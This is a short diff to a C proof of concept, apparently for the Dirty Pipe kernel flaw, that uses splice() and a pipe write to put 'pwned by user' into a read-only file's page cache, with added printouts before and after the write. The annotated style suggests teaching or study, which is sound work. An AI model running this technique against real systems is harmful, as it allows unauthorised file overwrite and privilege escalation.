@@ -62,7 +62,7 @@ void main()
    * USER:   create shared mapping of file at VA
    * KERNEL: just add page table entry mapping VA to PA in page cache
    */
-  void *file_mapping;
+  void *file_mapping = (void *)0x1337000;
   if(mmap(file_mapping, PAGESIZE, PROT_READ, MAP_SHARED, tfd, 0)
       !=file_mapping)
     exit(2);
@@ -76,14 +76,20 @@ void main()
   // KERNEL: just puts reference to page cache into 'pipe_bufffer'
   puts_getchar("About to splice() file to pipe");
   if(splice(tfd, 0, pipefds[1], 0, 5, 0)<0) { exit(1); }
-  // USER:   write to pipe
-  // KERNEL: writes it to file's representation in the page cache, 
-  //   appending to the offset where the splice stopped
+  /*
+   * USER:   write to pipe
+   * KERNEL: writes it to file's representation in the page cache, 
+   *   appending to the offset where the splice stopped
+   *
+   * Let's see what's in the page cache before writing...
+   */
+  printf("Page cache before writing: %s", file_mapping);
   puts_getchar("About to write() into page cache");
   if(write(pipefds[1], "pwned by user", 13)!=13) { exit(1); }
   /*
-   * Let's see what's in the page cache!
+   * ... and after writing.
    */
+  printf("Page cache after writing: %s", file_mapping);
   puts(file_mapping);
   // TOOD: Maybe flush page chache and do it again?
   exit(0);
